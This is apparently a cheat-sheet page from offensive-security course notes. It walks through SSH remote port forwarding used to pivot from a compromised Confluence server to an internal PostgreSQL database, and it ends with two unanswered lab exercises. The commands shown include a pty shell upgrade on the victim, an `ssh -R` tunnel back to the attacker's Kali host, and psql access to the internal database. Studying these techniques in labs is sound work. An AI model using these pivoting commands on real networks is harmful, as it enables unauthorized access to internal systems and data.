# SSH Remote Port Forwarding

The SSH remote port forward setup
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/SSH-Remote-Port-Forwarding-1.png)

Starting the SSH server on the Kali machine
>``` shell
>kali@kali:~$ sudo systemctl start ssh
>
># ========== Expected Result ==========
>[sudo] password for kali: 
># =====================================
>```

Checking that the SSH server on the Kali machine is listening
>``` shell
>kali@kali:~$ sudo ss -ntplu 
>
># ========== Expected Result ==========
>Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
>tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*     users:(("sshd",pid=181432,fd=3))
>tcp   LISTEN 0      128             [::]:22           [::]:*     users:(("sshd",pid=181432,fd=4))
># =====================================
>```

The SSH remote port forward being set up, connecting to the Kali machine
>``` shell
>confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/sh")'
>
># ========== Expected Result ==========
></bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
># =====================================
>
>$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
>
># ========== Expected Result ==========
>< 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4   
>Could not create directory '/home/confluence/.ssh'.
>The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
>ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>yes
>Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
>kali@192.168.118.4's password:
># =====================================
>```

Checking if port 2345 is bound on the Kali SSH server
>``` shell
>kali@kali:~$ ss -ntplu
>
># ========== Expected Result ==========
>Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
>tcp   LISTEN 0      128        127.0.0.1:2345      0.0.0.0:*
>tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
>tcp   LISTEN 0      128             [::]:22           [::]:*
># =====================================
>```

The SSH remote port forward command running
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/SSH-Remote-Port-Forwarding-2.png)

Listing databases on the PGDATABASE01, using psql through the SSH remote port forward
>``` shell
>kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres
>
># ========== Expected Result ==========
>Password for user postgres: 
>psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
>SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
>Type "help" for help.
># =====================================
>
>postgres=# \l
>
># ========== Expected Result ==========
>                                  List of databases
>    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
>------------+----------+----------+-------------+-------------+-----------------------
> confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
> postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
> template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
>            |          |          |             |             | postgres=CTc/postgres
> template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
>            |          |          |             |             | postgres=CTc/postgres
>(4 rows)
>
>postgres=# 
># =====================================
>```

Lab 1 - Start VM Group 1 and follow the example from this section. What's the value of the flag found in the hr_backup database payroll table?
>``` shell
>
>```
>

Lab 2 - Start VM Group 2. Download the ssh_remote_client binary from the Resources section. If you're running the aarch64 build of Kali, download the ssh_remote_client_aarch64 binary. Create an SSH remote port forward on CONFLUENCE01 that allows you to run the binary against port 4444 on PGDATABASE01 from your Kali machine.
>``` shell
>
>```
>
